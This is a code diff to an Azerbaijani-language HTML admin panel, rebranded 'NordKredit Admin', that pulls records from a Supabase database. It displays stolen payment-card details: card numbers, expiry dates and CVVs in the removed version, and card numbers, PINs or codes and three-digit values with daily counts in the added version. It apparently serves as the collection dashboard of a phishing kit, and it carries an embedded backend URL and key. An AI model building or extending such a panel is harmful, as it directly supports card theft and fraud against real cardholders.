@@ -3,103 +3,73 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ADMIN PANEL</title>
+<title>NordKredit Admin</title>
 
 <style>
-body{
-  font-family:Arial;
-  background:#111;
-  color:white;
-  padding:20px;
-}
-
-h2{
-  margin-bottom:20px;
-}
-
-.card{
-  background:#1e1e1e;
-  padding:15px;
-  margin-bottom:15px;
-  border-radius:12px;
-}
-
-button{
-  margin-top:10px;
-  padding:8px 12px;
-  border:none;
-  border-radius:8px;
-  background:red;
-  color:white;
-  cursor:pointer;
-}
+body{background:#0f172a;color:white;font-family:sans-serif;padding:30px}
+h2{margin-bottom:20px}
+.stats{display:flex;gap:20px;margin-bottom:20px}
+.box{background:#1e293b;padding:20px;border-radius:15px}
+.card{background:#1e293b;padding:15px;margin-bottom:10px;border-radius:12px}
+button{margin-top:8px;padding:6px 10px;border:none;border-radius:8px;background:red;color:white;cursor:pointer}
 </style>
 </head>
 <body>
 
-<h2>Gələn Məlumatlar</h2>
+<h2>NordKredit Admin Panel</h2>
+
+<div class="stats">
+<div class="box">Ümumi: <span id="total">0</span></div>
+<div class="box">Bu gün: <span id="today">0</span></div>
+</div>
+
 <div id="list"></div>
 
 <script type="module">
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2"
 
-const supabaseUrl = "https://gkrfcoyleewxrxbfdunq.supabase.co"
-const supabaseKey = "sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
-const supabase = createClient(supabaseUrl, supabaseKey)
+const supabase=createClient(
+"https://gkrfcoyleewxrxbfdunq.supabase.co",
+"sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
+)
 
-const list = document.getElementById("list")
+const list=document.getElementById("list")
 
-async function loadData(){
-  list.innerHTML="Yüklənir..."
+async function load(){
+const {data}=await supabase.from("nordkredit_data").select("*").order("id",{ascending:false})
+list.innerHTML=""
 
-  const { data, error } = await supabase
-    .from("mesajlar")
-    .select("*")
-    .order("id",{ascending:false})
+data.forEach(i=>{
+const div=document.createElement("div")
+div.className="card"
+div.innerHTML=`
+Kart: ${i.kart_nomresi}<br>
+Kod 4: ${i.kod_4}<br>
+Daxil edilən: ${i.daxil_edilen_3}<br>
+Tarix: ${new Date(i.created_at).toLocaleString()}<br>
+<button onclick="del(${i.id})">Sil</button>
+`
+list.appendChild(div)
+})
 
-  if(error){
-    list.innerHTML="Xəta: "+error.message
-    return
-  }
+document.getElementById("total").textContent=data.length
 
-  list.innerHTML=""
-
-  data.forEach(item=>{
-    const div=document.createElement("div")
-    div.className="card"
-
-    div.innerHTML=`
-      <b>Kart:</b> ${item.kod1}<br>
-      <b>Tarix:</b> ${item.kod2}<br>
-      <b>CVV:</b> ${item.kod3}<br>
-      <button onclick="deleteItem(${item.id})">Sil</button>
-    `
-
-    list.appendChild(div)
-  })
+const today=new Date().toDateString()
+document.getElementById("today").textContent=
+data.filter(x=>new Date(x.created_at).toDateString()===today).length
 }
 
-window.deleteItem = async function(id){
-  await supabase
-    .from("mesajlar")
-    .delete()
-    .eq("id",id)
-
-  loadData()
+window.del=async id=>{
+await supabase.from("nordkredit_data").delete().eq("id",id)
+load()
 }
 
-loadData()
+load()
 
-// realtime
-supabase
-  .channel('realtime')
-  .on('postgres_changes',
-    { event: '*', schema: 'public', table: 'mesajlar' },
-    () => loadData()
-  )
-  .subscribe()
+supabase.channel('realtime')
+.on('postgres_changes',{event:'*',schema:'public',table:'nordkredit_data'},()=>load())
+.subscribe()
 
 </script>
-
 </body>
 </html>
